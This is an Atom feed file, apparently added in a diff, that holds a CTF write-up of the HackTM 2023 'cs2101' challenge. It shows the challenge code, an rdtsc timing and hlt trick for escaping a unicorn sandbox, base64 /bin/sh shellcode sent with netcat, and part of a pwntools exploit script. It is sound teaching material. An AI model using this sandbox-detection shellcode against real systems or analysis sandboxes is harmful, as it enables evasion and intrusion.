@@ -1,0 +1,449 @@
+<?xml version="1.0" encoding="utf-8"?> 
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[cs2101 on repr]]></title>
+    
+        <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
+    
+    
+    
+            <link href="https://nasm.re/tags/cs2101/" rel="alternate" type="text/html" title="HTML" />
+            <link href="https://nasm.re/tags/cs2101/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
+    <updated>2023-05-17T02:33:59+02:00</updated>
+    
+        <author>
+            <name>nasm</name>
+            
+                <email>nasm@pm.me</email>
+            </author>
+        
+    <id>https://nasm.re/tags/cs2101/</id>
+        
+        <entry>
+            <title type="html"><![CDATA[[HackTM finals 2023 - pwn] cs2101]]></title>
+            <link href="https://nasm.re/posts/cs2101/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
+            <id>https://nasm.re/posts/cs2101/</id>
+            
+            <published>2023-05-15T00:00:00+00:00</published>
+            <updated>2023-05-15T00:00:00+00:00</updated>
+            
+            
+            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
+    <h1 id="cs2101">
+        cs2101
+        <a data-clipboard-text="https://nasm.re/posts/cs2101/#cs2101" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor cs2101" href="#cs2101">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h1>
+</div>
+<p><code>cs2101</code> is shellcoding / unicorn sandbox escape challenge I did during the <a
+  class="gblog-markdown__link"
+  href="https://ctfx.hacktm.ro/home"
+  
+  >HackTM finals</a
+>.</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="what-we-have">
+        What we have
+        <a data-clipboard-text="https://nasm.re/posts/cs2101/#what-we-have" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What we have" href="#what-we-have">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>The challenge is splitted into three file: the server, the unicorn callback based checker and the final C program that runs the shellcode without any restrictions. Let&rsquo;s take a look at the server:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python3</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">tempfile</span>
+<span class="kn">from</span> <span class="nn">sc_filter</span> <span class="kn">import</span> <span class="n">emulate</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">encoded</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Enter your base64 encoded shellcode:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+    <span class="n">encoded</span><span class="o">+=</span> <span class="s1">&#39;=======&#39;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encoded</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Error decoding your base64&#34;</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">emulate</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;I&#39;m not letting you hack me again!&#34;</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="k">with</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">NamedTemporaryFile</span><span class="p">()</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> 
+        <span class="n">f</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+
+        <span class="n">name</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">name</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;./emulate </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
+        
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div><p>The server is asking for a shellcode encoded in base64, then it is checking some behaviours of the shellcode by running it into unicorn through the <code>emulate</code> function and if it does not fail the shellcode is run by the <code>emulate</code> C program. Now let&rsquo;s take a quick look at the unicorn checker:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python3</span>
+
+<span class="kn">from</span> <span class="nn">unicorn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">unicorn.x86_const</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="c1"># memory address where emulation starts</span>
+<span class="n">ADDRESS</span> <span class="o">=</span> <span class="mh">0x1000000</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;sc.bin&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">code</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="n">emulate</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Done emulating. Passed!&#34;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Done emulating. Failed!&#34;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">emulate</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="c1"># Initialize emulator in X86-64bit mode</span>
+        <span class="n">mu</span> <span class="o">=</span> <span class="n">Uc</span><span class="p">(</span><span class="n">UC_ARCH_X86</span><span class="p">,</span> <span class="n">UC_MODE_64</span><span class="p">)</span>
+
+        <span class="c1"># map memory</span>
+        <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">ADDRESS</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>
+
+        <span class="c1"># shellcode to test</span>
+        <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">ADDRESS</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
+
+        <span class="c1"># initialize machine registers</span>
+        <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_X86_REG_RAX</span><span class="p">,</span> <span class="n">ADDRESS</span><span class="p">)</span>
+        <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_X86_REG_RFLAGS</span><span class="p">,</span> <span class="mh">0x246</span><span class="p">)</span>
+
+        <span class="c1"># initialize hooks</span>
+        <span class="n">allowed</span> <span class="o">=</span> <span class="p">[</span><span class="kc">True</span><span class="p">]</span>
+        <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_INSN</span><span class="p">,</span> <span class="n">syscall_hook</span><span class="p">,</span> <span class="n">allowed</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">UC_X86_INS_SYSCALL</span><span class="p">)</span>
+        <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_CODE</span><span class="p">,</span> <span class="n">code_hook</span><span class="p">,</span> <span class="n">allowed</span><span class="p">)</span>
+
+        <span class="c1"># emulate code in infinite time &amp; unlimited instructions</span>
+        <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">ADDRESS</span><span class="p">,</span> <span class="n">ADDRESS</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
+
+        <span class="k">return</span> <span class="n">allowed</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+
+    <span class="k">except</span> <span class="n">UcError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ERROR: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">e</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">syscall_hook</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
+    <span class="c1"># Syscalls are dangerous!</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;not allowed to use syscalls&#34;</span><span class="p">)</span>
+    <span class="n">user_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
+
+
+<span class="k">def</span> <span class="nf">code_hook</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
+    <span class="n">inst</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+
+    <span class="c1"># CPUID (No easy wins here!)</span>
+    <span class="k">if</span> <span class="n">inst</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x0f\xa2</span><span class="s1">&#39;</span><span class="p">:</span>
+        <span class="n">user_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;CPUID&#34;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div><p>To succeed the check in the server our shellcode should match several conditions: first there should not be any syscalls / <code>cpuid</code> instructions, then it should exit (and return allowed[0] === true) without triggering an exception not handled by unicorn (for example <code>SIGSEGV</code> or an interrupt not handled like <code>int 0x80</code>. And if it does so the shellcode is ran by this program:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#define ADDRESS ((void*)0x1000000)
+</span><span class="cp"></span>
+<span class="cm">/* gcc emulate.c -o emulate -masm=intel */</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Usage: %s &lt;filename&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kt">void</span> <span class="o">*</span><span class="n">code</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="n">ADDRESS</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span>
+                      <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span>
+                      <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">code</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;mmap&#34;</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">code</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="n">__asm__</span> <span class="k">volatile</span> <span class="p">(</span>
+        <span class="s">&#34;lea rcx, [rsp-0x1800]</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;fxrstor [rcx]</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;xor rbx, rbx</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;xor rcx, rcx</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;xor rdx, rdx</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;xor rdi, rdi</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;xor rsi, rsi</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;xor rbp, rbp</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;xor rsp, rsp</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;xor r8, r8</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;xor r9, r9</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;xor r10, r10</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;xor r11, r11</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;xor r12, r12</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;xor r13, r13</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;xor r14, r14</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;xor r15, r15</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="s">&#34;jmp rax</span><span class="se">\n\t</span><span class="s">&#34;</span>
+        <span class="o">:</span>
+        <span class="o">:</span> <span class="s">&#34;a&#34;</span> <span class="p">(</span><span class="n">code</span><span class="p">)</span>
+        <span class="o">:</span>
+    <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div><p>If we succeed to run the shellcode within this program we could easily execute syscalls and then drop a shell.</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="bypass-the-sandbox">
+        Bypass the sandbox
+        <a data-clipboard-text="https://nasm.re/posts/cs2101/#bypass-the-sandbox" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Bypass the sandbox" href="#bypass-the-sandbox">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>The first step is to make our shellcode aware of the environment inside which it is running. A classic trick to achieve this is to use the <code>rdtsc</code> instruction (<a
+  class="gblog-markdown__link"
+  href="https://www.felixcloutier.com/x86/rdtsc"
+  
+  >technical spec here</a
+>). According to the documentation, it:</p>
+<blockquote>
+<p>Reads the current value of the processor’s time-stamp counter (a 64-bit MSR) into the EDX:EAX registers. The EDX register is loaded with the high-order 32 bits of the MSR and the EAX register is loaded with the low-order 32 bits. (On processors that support the Intel 64 architecture, the high-order 32 bits of each of RAX and RDX are cleared.)</p>
+</blockquote>
+<p>Given within a debugger / emulator (depends on what is hooked actually, in an emulator it could be easily handled) the time between the execution of two instructions is very long we could check that the shellcode is ran casually by the C program without being hooked at each instruction (as it is the case in the unicorn sandbox) just by checking that the amount of time between two instructions is way shorter than in the sandbox. This way we can trigger a different code path in the shellcode according to the environment inside which it is run.</p>
+<p>The second step is about being able to leave the sandbox without any syscalls with a handled exception that will not throw an error. By reading the unicorn source code for a while I saw a comment that talked about the <code>hlt</code> instruction, then I tried to use it to shutdown the shellcode when it is run by the sandbox and it worked pretty good.</p>
+<div class="gblog-post__anchorwrap">
+    <h2 id="profit">
+        PROFIT
+        <a data-clipboard-text="https://nasm.re/posts/cs2101/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Putting it all together we manage to get the flag:</p>
+<pre tabindex="0"><code>[root@(none) chal]# nc 34.141.16.87 10000
+Enter your base64 encoded shellcode:
+DzFJicBIweIgSQnQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQDzFJicFIweIgSQnRTSnBSYH5AAEAAH8JSMfAagAAAf/g9EjHxAAAAAFIgcQABQAAamhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8F
+id
+uid=1000(user) gid=1000(user) groups=1000(user)
+ls
+emulate
+flag.txt
+requirements.txt
+run
+sc_filter.py
+server.py
+cat flag.txt
+HackTM{Why_can't_you_do_your_homework_normally...}
+</code></pre><div class="gblog-post__anchorwrap">
+    <h2 id="final-exploit">
+        Final exploit
+        <a data-clipboard-text="https://nasm.re/posts/cs2101/#final-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Final exploit" href="#final-exploit">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>Final epxloit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+
+<span class="c1"># this exploit was generated via</span>
+<span class="c1"># 1) pwntools</span>
+<span class="c1"># 2) ctfmate</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">pwn</span>
+
+<span class="n">BINARY</span> <span class="o">=</span> <span class="s2">&#34;emulate&#34;</span>
+<span class="n">LIBC</span> <span class="o">=</span> <span class="s2">&#34;/usr/lib/libc.so.6&#34;</span>
+<span class="n">LD</span> <span class="o">=</span> <span class="s2">&#34;/lib64/ld-linux-x86-64.so.2&#34;</span>
+
+<span class="c1"># Set up pwntools for the correct architecture</span>
+<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LIBC</span><span class="p">)</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LD</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">p64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span>
+<span class="n">u64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span>
+<span class="n">p32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span>
+<span class="n">u32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u32</span>
+<span class="n">p16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p16</span>
+<span class="n">u16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u16</span>
+<span class="n">p8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span>
+<span class="n">u8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u8</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>
+
+<span class="n">FILENAME</span> <span class="o">=</span> <span class="s2">&#34;shellcode&#34;</span>
+
+<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;shellcode&#34;</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
+    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">io</span>
+
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span><span class="s1">continue
+</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;shellcode&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span>
+
+    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span> 
+        <span class="s2">&#34;rdtsc</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;mov r8, rax</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;shl rdx, 32</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;or r8, rdx</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
+        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
